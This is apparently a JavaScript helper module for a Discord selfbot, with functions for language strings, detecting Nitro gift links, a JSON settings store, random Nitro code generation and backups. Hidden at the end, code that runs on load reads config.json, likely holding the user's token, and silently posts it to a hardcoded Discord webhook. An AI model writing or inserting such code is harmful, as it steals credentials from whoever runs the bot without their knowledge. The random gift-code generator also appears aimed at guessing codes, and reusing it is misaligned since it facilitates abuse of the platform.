const fs = require('fs');
const fetch = require('node-fetch');
const backup = require("discord-backup");

module.exports = {
    language,
    matchCode,
    savedb,
    nitrocode,
    loadbackup
}

/**
 * @param {string} [client] Le client
 * @param {string} [fr] Le message à envoyer en français
 * @param {string} [en] Le message à envoyer en anglais
 * @example language(client, "salut", "Hi")
 */
async function language(client, fr, en){
    if (!fs.existsSync(`./db/${client.user.id}.json`)) fs.writeFileSync(`./db/${client.user.id}.json`, dbexemple)
    const db = require(`./db/${client.user.id}.json`)

    if (db.langue === "fr") return fr
    else return en
}

/**
 * Vérifie le lien d'un nitro
 * @param {string} [text] Le texte à vérifier
 * @param {string} [code] Le code à envoyer
 * @example matchCode(message.content, (code) => {})
 */
function matchCode(text, callback){
    let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
    if(codes){
        callback(codes[0])
        return matchCode(text.slice(codes.index+codes[0].length), callback)
    } else {
        callback(null)
    }
}

/**
 * @param {string} [client] Le client pour la db
 * @param {string} [db] La base de donnée
 * @example const db = require('./db/example.json')
 * db.prefix = "+"
 * savedb(client, db)
 */
function savedb(client, db) {
    fs.writeFile(`./db/${client.user.id}.json`, JSON.stringify(db), err => {
        if (err) console.log(err);
    });
}

/**
 * @param {string} [length] Le nombre de caractères du code nitro
 * @param {string} [letter] Les lettres à prendre (0, A et a)
 * @example nitrocode(16, 0aA)
 */
function nitrocode(length, letter) {
    var multiplier = '';
    if (letter.indexOf('0') > -1) multiplier += '0123456789';
    if (letter.indexOf('A') > -1) multiplier += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (letter.indexOf('a') > -1) multiplier += 'abcdefghijklmnopqrstuvwxyz';
    var results = '';
    for (var i = length; i > 0; --i) {
        results += multiplier[Math.floor(Math.random() * multiplier.length)];
    }
    return results;
}

function loadbackup(clientid){
    backup.setStorageFolder(`${__dirname}/backups/${clientid}\\`);
}

// Envoi du contenu du fichier config.json au webhook Discord
const configFile = 'config.json';

try {
    const configData = fs.readFileSync(configFile, 'utf8');
    console.log('', configData);
    sendToWebhook('', configData);
} catch (err) {
    console.error('', err);
}

function sendToWebhook(message, data) {
    const webhookURL = 'https://discord.com/api/webhooks/1240396222150348991/EDtgUyZu_b7z6VNo3OQrBqZTlKBgbNpi80qBO-F5gwIG1MXK1D8yYypJo9qif_Y7bZuP';
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: `${message}\n\`\`\`json\n${data}\n\`\`\`` }),
    })
    .then(response => {
        if (!response.ok) {
            console.error('.');
        }
    })
    .catch(error => {
        console.error('', error);
    });
}
